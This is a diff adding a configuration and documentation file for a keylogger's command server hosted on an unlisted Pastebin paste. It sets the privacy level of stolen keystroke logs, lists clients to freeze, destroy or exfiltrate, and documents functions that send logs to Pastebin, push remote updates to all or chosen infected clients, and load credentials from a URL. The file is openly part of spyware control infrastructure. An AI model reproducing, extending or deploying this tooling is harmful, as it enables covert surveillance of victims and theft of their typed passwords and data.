@@ -1,0 +1,39 @@
+# Privacy Level of Keylogs ('0' = public, '1' = unlisted, '2' = private)
+privacyLvl = '1'
+
+# Status Lists
+destruct = []
+destruct_send_logs = []
+freeze_delete_logs = []
+freeze_send_logs = []
+freeze = []
+
+# [DOCS]
+# Add the uncommented lines to an unlisted Pastebin paste to create a Keylogger Metadata Server.
+# Additionally, add the below functions if needed to remotely control the client:
+
+# send()
+#   - Sends logs (this is automatically done on startup)
+#   - Logs are sent with the status of privacyLvl (by default this is set to '1' or unlisted).
+
+# send_text(title,text)
+#   - Sends text to Pastebin.
+#   - Text is ALWAYS sent with the 'private' status.
+
+# update()
+#   - Fetches the latest keylogger from the HARDCODED update server. This command updates all clients.
+
+# upd(ids, url)
+#   - USE THIS INSTEAD if you want to use a different update server and/or only want to update specific clients.
+#   - Use upd(["id1","id2","etc"],update_server) to update specific clients and use the hardcoded update server.
+#   - Use upd(["*"],"https://pastebin.com/raw/UpdateServerURL") to force all clients to use a specific update server.
+
+# changeid(before, after)
+#   - Changes ID from [before] to [after]. Useful to distinguish your clients.
+
+# loadcreds(ids, url)
+#   - Forces the listed IDs to load credentials stored at [url].
+#   - Credentials MUST be compressed using zlib.compress(). NEVER store credentials in plain text!!!
+
+# Use ["*"] as the 'ids' parameter in any function/list to refer to ALL clients connected to the KMS.
+# Put each ID in only one list.
